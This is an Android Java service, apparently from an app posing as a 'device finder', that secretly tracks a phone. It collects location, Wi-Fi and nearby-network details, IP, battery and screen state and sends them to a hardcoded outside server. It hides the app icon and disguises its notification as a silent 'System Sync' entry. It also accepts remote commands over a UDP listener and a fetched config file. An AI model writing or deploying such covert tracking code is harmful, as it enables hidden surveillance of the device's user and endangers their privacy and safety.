package com.example.devicefinder;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.hardware.Sensor;
import android.hardware.SensorManager;
import android.hardware.TriggerEvent;
import android.hardware.TriggerEventListener;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;

public class TrackingService extends Service implements LocationListener {

    private LocationManager locationManager;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private ConnectivityManager.NetworkCallback networkCallback;
    private AlarmManager alarmManager;
    private PowerManager.WakeLock wakeLock;
    private WifiManager.WifiLock wifiLock;
    private PendingIntent alarmPendingIntent;
    
    private SensorManager sensorManager;
    private Sensor motionSensor;

    private long reportIntervalMs = 1800 * 1000L; // 默认 30 分钟
    private String accuracyMode = "coarse";
    private Location lastLocation = null;
    private int reportCount = 0;
    
    private boolean enableWifiLock = true;
    private boolean enableMotionTrigger = true;

    private static long lastReportTime = 0;
    private static int consecutiveFailures = 0;
    private static boolean isListeningForRescue = false;

    // ⚠️【基础配置区】请按需修改
    private static String defaultServerUrl = "http://dingwei.bai001.de5.net/api/report";
    private static final String DEFAULT_REMOTE_CONFIG_URL = "https://your-config-url.com/config.txt";
    private static final String AUTH_TOKEN = "your_private_secret_key";
    private static final String RESCUE_SECRET = "your_private_secret_key";
    
    private static long lastConfigFetchTime = 0;

    @Override
    public void onCreate() {
        super.onCreate();
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        startForegroundNotification();

        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (pm != null) {
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "DeviceFinder::WakeLock");
            wakeLock.setReferenceCounted(false);
        }

        WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        if (wifiManager != null) {
            wifiLock = wifiManager.createWifiLock(WifiManager.WIFI_MODE_FULL_HIGH_PERF, "DeviceFinder::WifiLock");
            wifiLock.setReferenceCounted(false);
        }

        alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        
        Intent reportIntent = new Intent(this, TrackingService.class);
        reportIntent.setAction("ACTION_ALARM_TRIGGER");
        int flags = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE : PendingIntent.FLAG_UPDATE_CURRENT;
        alarmPendingIntent = PendingIntent.getService(this, 1001, reportIntent, flags);

        sensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);
        if (sensorManager != null) {
            motionSensor = sensorManager.getDefaultSensor(Sensor.TYPE_SIGNIFICANT_MOTION);
        }

        handleIconVisibility(true);
        triggerRescueListener(); 
        toggleMotionSensor(true); 

        requestSingleLocationAndReport();
        registerNetworkCallback();
        startLocationUpdates();
        scheduleHeartbeatAlarm();
    }

    private void toggleMotionSensor(boolean enable) {
        if (sensorManager == null || motionSensor == null) return;
        if (enable && enableMotionTrigger) {
            sensorManager.requestTriggerSensor(motionListener, motionSensor);
        } else {
            sensorManager.cancelTriggerSensor(motionListener, motionSensor);
        }
    }

    private final TriggerEventListener motionListener = new TriggerEventListener() {
        @Override
        public void onTrigger(TriggerEvent event) {
            Log.d("TrackingService", "检测到手机移动，强制唤醒上报！");
            sendReport(true, true);
            toggleMotionSensor(true); 
        }
    };

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String action = intent.getAction();
            if ("ACTION_MANUAL_REPORT".equals(action) || "ACTION_FORCE_REPORT".equals(action)) {
                sendReport(true, true);
            } else if ("ACTION_UPDATE_SERVER".equals(action) || "ACTION_ADB_UPDATE".equals(action)) {
                String newUrl = intent.getStringExtra("server_url");
                if (newUrl != null && !newUrl.isEmpty()) {
                    saveNewServerUrl(newUrl);
                    sendReport(false, true);
                }
            } else if ("ACTION_UPDATE_CONFIG_URL".equals(action)) {
                String newConfigUrl = intent.getStringExtra("config_url");
                handleUpdateConfigUrl(newConfigUrl);
            } else if ("ACTION_HEARTBEAT".equals(action)) {
                triggerRescueListener();
                fetchRemoteConfig();
                scheduleHeartbeatAlarm();
            } else if ("ACTION_PLAY_ALARM".equals(action)) {
                playAlarm();
            } else if ("ACTION_ALARM_TRIGGER".equals(action)) {
                if (enableWifiLock && wifiLock != null && !wifiLock.isHeld()) wifiLock.acquire();
                sendReport(true, true);
                reportCount++;
                scheduleNextReport();
                handler.postDelayed(() -> { if (wifiLock != null && wifiLock.isHeld()) wifiLock.release(); }, 15000);
            }
        }
        return START_STICKY;
    }

    private void playAlarm() {
        try {
            android.media.Ringtone ringtone = android.media.RingtoneManager.getRingtone(getApplicationContext(), android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_ALARM));
            if (ringtone != null) {
                android.media.AudioManager audioManager = (android.media.AudioManager) getSystemService(Context.AUDIO_SERVICE);
                if (audioManager != null) {
                    audioManager.setStreamVolume(android.media.AudioManager.STREAM_ALARM, audioManager.getStreamMaxVolume(android.media.AudioManager.STREAM_ALARM), 0);
                }
                ringtone.play();
                handler.postDelayed(() -> { if (ringtone.isPlaying()) ringtone.stop(); }, 30000);
            }
        } catch (Exception ignored) {}
    }

    // 【修改点】极限隐身的状态栏通知
    private void startForegroundNotification() {
        String channelId = "device_guardian_channel";
        Notification.Builder builder;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationManager manager = (NotificationManager) getSystemService(NotificationManager.class);
            // 将通知渠道级别设为最低，完全静音，不弹横幅，不在锁屏显示
            NotificationChannel channel = new NotificationChannel(channelId, "系统服务", NotificationManager.IMPORTANCE_MIN);
            channel.setShowBadge(false);
            channel.setSound(null, null);
            channel.enableVibration(false);
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            if (manager != null) manager.createNotificationChannel(channel);
            builder = new Notification.Builder(this, channelId);
        } else {
            builder = new Notification.Builder(this);
            builder.setPriority(Notification.PRIORITY_MIN);
        }

        // 使用系统自带的“同步”图标，极其不起眼
        int iconRes = android.R.drawable.stat_notify_sync; 

        Notification notification = builder
                .setContentTitle("系统同步")
                .setContentText("正在运行...")
                .setSmallIcon(iconRes)
                .setOngoing(true)
                .build();

        notification.priority = Notification.PRIORITY_MIN;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            notification.setForegroundServiceBehavior(Notification.FOREGROUND_SERVICE_IMMEDIATE);
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(1001, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(1001, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
        } else {
            startForeground(1001, notification);
        }
    }

    private void scheduleHeartbeatAlarm() {
        if (alarmManager == null) return;
        Intent intent = new Intent(this, TrackingService.class);
        intent.setAction("ACTION_HEARTBEAT");
        int flags = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE : PendingIntent.FLAG_UPDATE_CURRENT;
        PendingIntent pi = PendingIntent.getService(this, 9999, intent, flags);
        long triggerAt = System.currentTimeMillis() + 6 * 60 * 60 * 1000L;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) alarmManager.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, pi);
        else alarmManager.set(AlarmManager.RTC_WAKEUP, triggerAt, pi);
    }

    private String getUniqueDeviceId() {
        SharedPreferences sp = getSharedPreferences("device_finder_prefs", MODE_PRIVATE);
        String deviceId = sp.getString("saved_device_id", null);
        if (deviceId == null) {
            String model = Build.MODEL != null ? Build.MODEL.replaceAll("\\s+", "_") : "UnknownPhone";
            String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            String suffix = (androidId != null && androidId.length() >= 4) ? androidId.substring(androidId.length() - 4) : "0000";
            deviceId = model + "_" + suffix;
            sp.edit().putString("saved_device_id", deviceId).apply();
        }
        return deviceId;
    }

    private String getCurrentServerUrl() {
        SharedPreferences sp = getSharedPreferences("device_finder_prefs", MODE_PRIVATE);
        return sp.getString("saved_server_url", defaultServerUrl);
    }

    private void saveNewServerUrl(String newUrl) {
        if (newUrl != null && !newUrl.isEmpty()) {
            SharedPreferences sp = getSharedPreferences("device_finder_prefs", MODE_PRIVATE);
            sp.edit().putString("saved_server_url", newUrl).apply();
        }
    }

    private String getRemoteConfigUrl() {
        SharedPreferences sp = getSharedPreferences("device_finder_prefs", MODE_PRIVATE);
        return sp.getString("saved_config_url", DEFAULT_REMOTE_CONFIG_URL);
    }

    private void saveRemoteConfigUrl(String url) {
        if (url != null && !url.isEmpty()) {
            SharedPreferences sp = getSharedPreferences("device_finder_prefs", MODE_PRIVATE);
            sp.edit().putString("saved_config_url", url).apply();
        }
    }

    private void handleUpdateConfigUrl(String newConfigUrl) {
        if (newConfigUrl != null && !newConfigUrl.isEmpty()) {
            saveRemoteConfigUrl(newConfigUrl);
            lastConfigFetchTime = 0; 
            fetchRemoteConfig();
        }
    }

    private void handleIconVisibility(boolean hideIcon) {
        try {
            PackageManager p = getPackageManager();
            ComponentName componentName = new ComponentName(this, "com.example.devicefinder.VisibleAliasActivity");
            int newState = hideIcon ? PackageManager.COMPONENT_ENABLED_STATE_DISABLED : PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
            if (p.getComponentEnabledSetting(componentName) != newState) p.setComponentEnabledSetting(componentName, newState, PackageManager.DONT_KILL_APP);
        } catch (Exception ignored) {}
    }

    private void registerNetworkCallback() {
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                NetworkRequest request = new NetworkRequest.Builder().addTransportType(NetworkCapabilities.TRANSPORT_WIFI).build();
                networkCallback = new ConnectivityManager.NetworkCallback() {
                    @Override
                    public void onAvailable(Network network) {
                        super.onAvailable(network);
                        String oldSsid = DeviceInfoUtils.cachedSsid;
                        String[] wifiInfo = DeviceInfoUtils.getWifiInfo(TrackingService.this);
                        String newSsid = wifiInfo[0];
                        if (newSsid.equals("UNKNOWN") || newSsid.equals("<unknown ssid>")) return;
                        if (!oldSsid.equals(newSsid) && !oldSsid.equals("UNKNOWN")) {
                            sendReport(true, false);
                            triggerRescueListener();
                        }
                    }
                    @Override
                    public void onLost(Network network) {
                        super.onLost(network);
                        sendReport(true, false);
                    }
                };
                cm.registerNetworkCallback(request, networkCallback);
            }
        } catch (Exception ignored) {}
    }

    private void startLocationUpdates() {
        try {
            locationManager.removeUpdates(this);
            long minTime = 60000L;
            if ("fine".equals(accuracyMode) && locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, minTime, 0f, this);
            }
            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, minTime, 0f, this);
            }
        } catch (SecurityException ignored) {}
    }

    private void requestSingleLocationAndReport() {
        final boolean[] reported = new boolean[]{false};
        final Handler timeoutHandler = new Handler(Looper.getMainLooper());
        final LocationListener singleListener = new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {
                if (location != null) lastLocation = location;
                if (!reported[0]) {
                    reported[0] = true;
                    timeoutHandler.removeCallbacksAndMessages(null);
                    try { locationManager.removeUpdates(this); } catch (Exception ignored) {}
                    sendReport(true, false);
                    reportCount = 1;
                    scheduleNextReport();
                }
            }
            @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
            @Override public void onProviderEnabled(String provider) {}
            @Override public void onProviderDisabled(String provider) {}
        };
        try {
            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, singleListener, Looper.getMainLooper());
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, singleListener, Looper.getMainLooper());
        } catch (SecurityException ignored) {}
        timeoutHandler.postDelayed(() -> {
            if (!reported[0]) {
                reported[0] = true;
                try { locationManager.removeUpdates(singleListener); } catch (Exception ignored) {}
                sendReport(true, false);
                reportCount = 1;
                scheduleNextReport();
            }
        }, 10000);
    }

    private void scheduleNextReport() {
        if (alarmManager == null || alarmPendingIntent == null) return;

        long delay = (reportCount == 1 || reportCount == 2) ? 3 * 60 * 1000L : reportIntervalMs;
        long triggerAtMillis = System.currentTimeMillis() + delay;

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAtMillis, alarmPendingIntent);
            } else {
                alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerAtMillis, alarmPendingIntent);
            }
        } catch (SecurityException e) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAtMillis, alarmPendingIntent);
            } else {
                alarmManager.set(AlarmManager.RTC_WAKEUP, triggerAtMillis, alarmPendingIntent);
            }
        }
    }

    private void sendReport(final boolean withNearbyWifi, boolean force) {
        sendReport(withNearbyWifi, force, null);
    }

    private void sendReport(final boolean withNearbyWifi, boolean force, final String overrideUrl) {
        long currentTime = System.currentTimeMillis();
        if (!force && currentTime - lastReportTime < 5000) return; 
        lastReportTime = currentTime;

        final String activeUrl = (overrideUrl != null && !overrideUrl.isEmpty()) ? overrideUrl : getCurrentServerUrl();

        new Thread(() -> {
            boolean success = false;
            if (enableWifiLock && wifiLock != null && !wifiLock.isHeld()) {
                wifiLock.acquire();
            }
            try {
                if (wakeLock != null) wakeLock.acquire(10000);
                int[] battery = DeviceInfoUtils.getBatteryInfo(TrackingService.this);
                String[] wifi = DeviceInfoUtils.getWifiInfo(TrackingService.this);
                String ip = DeviceInfoUtils.getLocalIpAddress();
                Location loc = lastLocation;
                if (loc == null) {
                    try {
                        loc = getBetterLocation(locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER), locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER));
                        loc = getBetterLocation(loc, locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER));
                    } catch (SecurityException ignored) {}
                }
                JSONObject json = new JSONObject();
                json.put("device_id", getUniqueDeviceId());
                json.put("token", AUTH_TOKEN);
                json.put("timestamp", System.currentTimeMillis());
                
                json.put("os_version", "Android " + Build.VERSION.RELEASE); 
                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                json.put("is_screen_on", pm != null && pm.isInteractive());
                json.put("uptime_ms", android.os.SystemClock.elapsedRealtime());

                JSONObject battObj = new JSONObject();
                battObj.put("level", battery[0]);
                battObj.put("is_charging", battery[1] == 1);
                json.put("battery", battObj);
                JSONObject netObj = new JSONObject();
                netObj.put("wifi_ssid", wifi[0]);
                netObj.put("wifi_bssid", wifi[1]);
                netObj.put("wifi_rssi", Integer.parseInt(wifi[2]));
                netObj.put("local_ip", ip);
                json.put("network", netObj);
                JSONObject locObj = new JSONObject();
                if (loc != null) {
                    locObj.put("latitude", loc.getLatitude()); locObj.put("longitude", loc.getLongitude());
                    locObj.put("accuracy", loc.getAccuracy()); locObj.put("provider", loc.getProvider()); locObj.put("time", loc.getTime());
                } else {
                    locObj.put("latitude", JSONObject.NULL); locObj.put("longitude", JSONObject.NULL);
                    locObj.put("accuracy", -1.0); locObj.put("provider", "none"); locObj.put("time", 0L);
                }
                json.put("location", locObj);
                if (withNearbyWifi) {
                    try {
                        List<JSONObject> nearby = DeviceInfoUtils.scanNearbyWifi(TrackingService.this);
                        if (nearby != null && !nearby.isEmpty()) {
                            JSONArray arr = new JSONArray();
                            for (JSONObject obj : nearby) arr.put(obj);
                            json.put("nearby_wifi", arr);
                        }
                    } catch (Exception ignored) {}
                }
                URL url = new URL(activeUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setConnectTimeout(10000); conn.setReadTimeout(10000); conn.setDoOutput(true);
                OutputStream os = conn.getOutputStream();
                os.write(json.toString().getBytes("UTF-8")); os.flush(); os.close();
                if (conn.getResponseCode() == 200) {
                    BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    StringBuilder sb = new StringBuilder(); String line;
                    while ((line = br.readLine()) != null) sb.append(line);
                    br.close();
                    if (overrideUrl == null) parseResponse(new JSONObject(sb.toString()));
                    success = true;
                }
                conn.disconnect();
            } catch (Exception e) {
                Log.e("TrackingService", "===== 上报失败啦 =====");
                Log.e("TrackingService", "目标URL: " + activeUrl);
                Log.e("TrackingService", "报错原因: " + e.toString());
            } finally {
                if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
                if (wifiLock != null && wifiLock.isHeld()) wifiLock.release(); 
            }
            if (success) {
                consecutiveFailures = 0;
                fetchRemoteConfig();
            } else {
                if (overrideUrl == null) {
                    consecutiveFailures++;
                    if (consecutiveFailures >= 1) {
                        triggerRescueListener();
                        fetchRemoteConfig();
                    }
                }
            }
        }).start();
    }

    private void fetchRemoteConfig() {
        String configUrl = getRemoteConfigUrl();
        if (configUrl.contains("your-config-url.com")) return;
        long now = System.currentTimeMillis();
        if (now - lastConfigFetchTime < 10 * 60 * 1000L) return;
        lastConfigFetchTime = now;
        new Thread(() -> {
            try {
                URL url = new URL(configUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET"); conn.setConnectTimeout(5000); conn.setReadTimeout(5000);
                if (conn.getResponseCode() == 200) {
                    BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    StringBuilder sb = new StringBuilder(); String line;
                    while ((line = br.readLine()) != null) sb.append(line);
                    br.close();
                    String newUrl = sb.toString().trim();
                    if (newUrl.startsWith("http") && !newUrl.equals(getCurrentServerUrl())) {
                        saveNewServerUrl(newUrl); consecutiveFailures = 0; sendReport(true, true);
                    }
                }
                conn.disconnect();
            } catch (Exception ignored) {}
        }).start();
    }

    private Location getBetterLocation(Location l1, Location l2) {
        if (l1 == null) return l2; if (l2 == null) return l1;
        long timeDelta = l2.getTime() - l1.getTime();
        boolean isSignificantlyNewer = timeDelta > 120000; boolean isSignificantlyOlder = timeDelta < -120000;
        boolean isNewer = timeDelta > 0;
        if (isSignificantlyNewer) return l2; else if (isSignificantlyOlder) return l1;
        int accuracyDelta = (int) (l2.getAccuracy() - l1.getAccuracy());
        boolean isLessAccurate = accuracyDelta > 0; boolean isMoreAccurate = accuracyDelta < 0;
        boolean isSignificantlyLessAccurate = accuracyDelta > 200;
        boolean isFromSameProvider = l2.getProvider() != null && l2.getProvider().equals(l1.getProvider());
        if (isMoreAccurate) return l2; else if (isNewer && !isLessAccurate) return l2;
        else if (isNewer && !isSignificantlyLessAccurate && isFromSameProvider) return l2;
        return l1;
    }

    private void triggerRescueListener() {
        if (!isListeningForRescue) startRescueListener();
    }

    private void startRescueListener() {
        isListeningForRescue = true;
        new Thread(() -> {
            DatagramSocket rescueSocket = null;
            try {
                rescueSocket = new DatagramSocket(8888);
                rescueSocket.setBroadcast(true);
                rescueSocket.setSoTimeout(0); 
                byte[] buffer = new byte[512];
                DatagramPacket packet = new DatagramPacket(buffer, buffer.length);
                while (true) {
                    rescueSocket.receive(packet);
                    String message = new String(packet.getData(), 0, packet.getLength());
                    if (message.startsWith("FIND_ME_SERVER:")) {
                        String[] parts = message.split(":", 3);
                        if (parts.length == 3 && RESCUE_SECRET.equals(parts[1])) {
                            saveNewServerUrl(parts[2].trim()); consecutiveFailures = 0; sendReport(true, true); break;
                        }
                    } else if (message.startsWith("FIND_ME_CONFIG:")) {
                        String[] parts = message.split(":", 3);
                        if (parts.length == 3 && RESCUE_SECRET.equals(parts[1])) { handleUpdateConfigUrl(parts[2].trim()); }
                    } else if (message.startsWith("FIND_ME_REPORT:")) {
                        String[] parts = message.split(":", 2);
                        if (parts.length == 2 && RESCUE_SECRET.equals(parts[1])) { sendReport(true, true); }
                    } else if (message.startsWith("FIND_ME_REPORT_TEMP:")) {
                        String[] parts = message.split(":", 3);
                        if (parts.length == 3 && RESCUE_SECRET.equals(parts[1])) { sendReport(true, true, parts[2].trim()); }
                    } else if (message.startsWith("FIND_ME_ALARM:")) {
                        String[] parts = message.split(":", 2);
                        if (parts.length == 2 && RESCUE_SECRET.equals(parts[1])) { playAlarm(); }
                    }
                }
            } catch (Exception e) {
                 Log.e("TrackingService", "UDP 监听异常: " + e.toString());
            } finally {
                if (rescueSocket != null && !rescueSocket.isClosed()) rescueSocket.close();
                isListeningForRescue = false;
            }
        }).start();
    }

    private void parseResponse(JSONObject res) {
        if (!res.has("config")) return;
        JSONObject cfg = res.optJSONObject("config");
        if (cfg == null) return;
        long newInterval = cfg.optLong("report_interval_seconds", 1800) * 1000L;
        String newAccuracy = cfg.optString("accuracy_mode", "coarse");
        
        boolean newEnableWifiLock = cfg.optBoolean("enable_wifi_lock", true);
        boolean newEnableMotionTrigger = cfg.optBoolean("enable_motion_trigger", true);
        
        if (newEnableWifiLock != enableWifiLock || newEnableMotionTrigger != enableMotionTrigger) {
            enableWifiLock = newEnableWifiLock;
            enableMotionTrigger = newEnableMotionTrigger;
            toggleMotionSensor(enableMotionTrigger);
        }

        if (newInterval != reportIntervalMs || !newAccuracy.equals(accuracyMode)) {
            reportIntervalMs = newInterval; accuracyMode = newAccuracy;
            handler.post(() -> {
                startLocationUpdates();
                if (reportCount >= 3) scheduleNextReport();
            });
        }
        String nextServerUrl = cfg.optString("next_server_url", "");
        if (!nextServerUrl.isEmpty() && !nextServerUrl.equals(getCurrentServerUrl())) { saveNewServerUrl(nextServerUrl); sendReport(true, true); }
        String nextConfigUrl = cfg.optString("next_config_url", "");
        if (!nextConfigUrl.isEmpty() && !nextConfigUrl.equals(getRemoteConfigUrl())) { handleUpdateConfigUrl(nextConfigUrl); }
        handleIconVisibility(cfg.optBoolean("hide_icon", true));
    }

    @Override public void onLocationChanged(Location location) { if (location != null) lastLocation = location; }
    @Override public void onDestroy() {
        super.onDestroy();
        if (wifiLock != null && wifiLock.isHeld()) wifiLock.release();
        if (sensorManager != null && motionListener != null) sensorManager.cancelTriggerSensor(motionListener, motionSensor);
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm != null && networkCallback != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) cm.unregisterNetworkCallback(networkCallback);
        } catch (Exception ignored) {}
    }
    @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
    @Override public void onProviderEnabled(String provider) {}
    @Override public void onProviderDisabled(String provider) {}
    @Override public IBinder onBind(Intent intent) { return null; }
}
